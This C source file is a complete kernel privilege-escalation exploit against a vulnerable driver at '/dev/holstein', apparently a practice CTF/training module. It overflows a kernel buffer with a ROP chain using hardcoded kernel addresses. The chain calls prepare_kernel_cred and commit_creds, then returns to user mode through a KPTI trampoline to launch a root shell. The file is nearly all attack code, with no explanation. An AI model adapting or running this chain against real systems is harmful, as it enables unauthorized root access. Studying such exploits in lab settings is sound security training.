#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int global_fd;
unsigned long user_cs, user_ss, user_rsp, user_rflags;
#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds 0xffffffff8106e390
#define rop_pop_rdi 0xffffffff8127bbdc
#define rop_pop_rcx 0xffffffff8132cdd3
#define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
#define rop_swapgs 0xffffffff8160bf7e
#define rop_iretq 0xffffffff810202af
#define tramp 0xffffffff81800e26;

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}
void open_kn() {
  global_fd = open("/dev/holstein", O_RDWR);
  if (global_fd < 0) {
    exit(-1);
  }
}
static void save_state() {
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}
void fatal(const char *msg) {
  perror(msg);
  exit(1);
}
int main() {
  save_state();
  open_kn();
  char buf[0x500];
  memset(buf, 'A', 0x408);
  unsigned long *chain = (unsigned long *)&buf[0x408];
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = tramp;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
  write(global_fd, buf, (void *)chain - (void *)buf);

  close(global_fd);

  return 0;
}
